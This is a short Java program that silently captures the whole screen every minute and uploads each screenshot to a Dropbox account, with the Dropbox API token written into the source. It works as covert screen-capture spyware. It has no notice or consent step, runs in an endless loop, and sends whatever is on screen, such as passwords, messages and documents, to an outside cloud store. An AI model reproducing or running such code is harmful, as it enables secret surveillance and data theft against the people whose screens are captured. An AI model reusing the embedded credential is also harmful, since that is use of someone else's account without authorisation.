package Application;

import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.text.SimpleDateFormat;
import java.util.Date;

import javax.imageio.ImageIO;

import com.dropbox.core.DbxRequestConfig;
import com.dropbox.core.v2.DbxClientV2;

public class Main extends Thread{
	public static void main(String[] args) {
		
		// Create Dropbox client
		final String KEY_API = "1fgiibsCCyAAAAAAAAAACtZFG363XAb1vEMCjn30v6Ad8CJYbu4iDBiaFpk-YGRF";
        DbxRequestConfig config = DbxRequestConfig.newBuilder("dropbox/java-tutorial").build();
        DbxClientV2 client = new DbxClientV2(config, KEY_API);
	int count = 0;
        while(true) {
        try {
        	SimpleDateFormat dateformat = new SimpleDateFormat("yyyyMMdd");
        	Date date = new Date();
        	
        	//Получаем скрин
        	BufferedImage image = new Robot().createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
        	ByteArrayOutputStream os = new ByteArrayOutputStream();
        	ImageIO.write(image, "png", os);
        	
        	//Загружаем      	
        	InputStream input =  new ByteArrayInputStream(os.toByteArray());
            client.files().uploadBuilder("/" + dateformat.format(date) + count + ".png").uploadAndFinish(input);
            count++;
            sleep(60000);
        } catch(Exception e) {
        	e.printStackTrace();
        }
        }
	}
}
